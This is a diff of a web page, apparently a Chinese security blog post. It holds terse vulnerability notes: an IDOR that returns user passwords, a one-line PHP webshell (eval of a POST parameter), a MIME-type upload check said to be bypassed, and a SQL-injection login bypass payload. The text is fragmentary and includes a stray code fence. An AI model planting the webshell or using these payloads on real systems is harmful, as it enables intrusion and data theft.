@@ -168,18 +168,19 @@ window.onload=getCSS();
 2.复现过程:登录已知用户-&gt;修改用户ID-&gt;返回用户信息(包括用户密码)</p>
 <p>文件上传:<br>
 一句话木马:</p>
-<?php
+<pre><code class="language-PHP">&lt;?php
 eval($_POST['cmd']);
 ? 绕过 :
 
-<?php 
+&lt;?php 
 if ((
-    ($_FILES["file"]["type"] == "image/gif")
-        || ($_FILES["file"]["type"] == "image/jpeg")
-        || ($_FILES["file"]["type"] == "image/jpg")
-        || ($_FILES["file"]["type"] == "image/pjpeg")
-        || ($_FILES["file"]["type"] == "image/x-png")
-        || ($_FILES["file"]["type"] == "image/png"))
+    ($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/gif&quot;)
+        || ($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/jpeg&quot;)
+        || ($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/jpg&quot;)
+        || ($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/pjpeg&quot;)
+        || ($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/x-png&quot;)
+        || ($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/png&quot;))
+        ```
 path : /var/www/html
 uid : server/upload/
 
@@ -194,7 +195,8 @@ waf:
 注入:
 漏洞1(SQL注入):
 1.危害:无密码登录
-2.复现过程:登录时用户名部分填入admin' or '1'='1 密码任意->无密码登录成功
+2.复现过程:登录时用户名部分填入admin' or '1'='1 密码任意-&gt;无密码登录成功</code></pre>
+
 							</div>
 	<div class="wow bounceInDown vt-post-tags">
  
